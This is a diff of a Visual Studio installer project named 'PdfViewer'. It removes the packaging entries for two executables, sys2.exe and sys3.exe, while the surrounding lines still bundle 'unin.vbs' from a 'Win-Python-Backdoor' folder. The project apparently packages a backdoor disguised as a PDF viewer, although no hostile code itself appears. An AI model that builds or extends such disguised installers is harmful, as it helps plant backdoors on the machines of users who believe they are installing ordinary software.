@@ -33,12 +33,6 @@
         }
         "Entry"
         {
-        "MsmKey" = "8:_32326F9B01584275935F5721BDC128E5"
-        "OwnerKey" = "8:_UNDEFINED"
-        "MsmSig" = "8:_UNDEFINED"
-        }
-        "Entry"
-        {
         "MsmKey" = "8:_38A2E542622A45C0B5F20CA993E8F2B5"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
@@ -88,12 +82,6 @@
         "Entry"
         {
         "MsmKey" = "8:_8655D1B65CCA4E8BA7278F4842320998"
-        "OwnerKey" = "8:_UNDEFINED"
-        "MsmSig" = "8:_UNDEFINED"
-        }
-        "Entry"
-        {
-        "MsmKey" = "8:_B2F2BC47D3D544F882E859D44C960519"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
@@ -250,26 +238,6 @@
             "TargetName" = "8:adobesys.xml"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
-            "Condition" = "8:"
-            "Transitive" = "11:FALSE"
-            "Vital" = "11:TRUE"
-            "ReadOnly" = "11:FALSE"
-            "Hidden" = "11:FALSE"
-            "System" = "11:FALSE"
-            "Permanent" = "11:FALSE"
-            "SharedLegacy" = "11:FALSE"
-            "PackageAs" = "3:1"
-            "Register" = "3:1"
-            "Exclude" = "11:FALSE"
-            "IsDependency" = "11:FALSE"
-            "IsolateTo" = "8:"
-            }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_32326F9B01584275935F5721BDC128E5"
-            {
-            "SourcePath" = "8:..\\..\\C++\\Release\\sys3.exe"
-            "TargetName" = "8:sys3.exe"
-            "Tag" = "8:"
-            "Folder" = "8:_A4A286D4624E4C09A4C2E55D48F6201A"
             "Condition" = "8:"
             "Transitive" = "11:FALSE"
             "Vital" = "11:TRUE"
@@ -464,26 +432,6 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_B2F2BC47D3D544F882E859D44C960519"
-            {
-            "SourcePath" = "8:..\\..\\C++\\Release\\sys2.exe"
-            "TargetName" = "8:sys2.exe"
-            "Tag" = "8:"
-            "Folder" = "8:_A4A286D4624E4C09A4C2E55D48F6201A"
-            "Condition" = "8:"
-            "Transitive" = "11:FALSE"
-            "Vital" = "11:TRUE"
-            "ReadOnly" = "11:FALSE"
-            "Hidden" = "11:FALSE"
-            "System" = "11:FALSE"
-            "Permanent" = "11:FALSE"
-            "SharedLegacy" = "11:FALSE"
-            "PackageAs" = "3:1"
-            "Register" = "3:1"
-            "Exclude" = "11:FALSE"
-            "IsDependency" = "11:FALSE"
-            "IsolateTo" = "8:"
-            }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_FA1D03CCC97B41A3B09C011C0BABBFB0"
             {
             "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\unin.vbs"
@@ -584,7 +532,7 @@
         "Name" = "8:Microsoft Visual Studio"
         "ProductName" = "8:PdfViewer"
         "ProductCode" = "8:{98F8450D-4A66-4E18-8FCE-08606DE0F6C6}"
-        "PackageCode" = "8:{1D5EE91A-488A-44D1-8B02-1CBC659AA5B3}"
+        "PackageCode" = "8:{11D0D43B-15BE-40E9-B80D-99F9A48EB1B9}"
         "UpgradeCode" = "8:{C3C953E8-4B5D-4005-9499-3D2A2CF54F8C}"
         "AspNetVersion" = "8:4.0.30319.0"
         "RestartWWWService" = "11:FALSE"
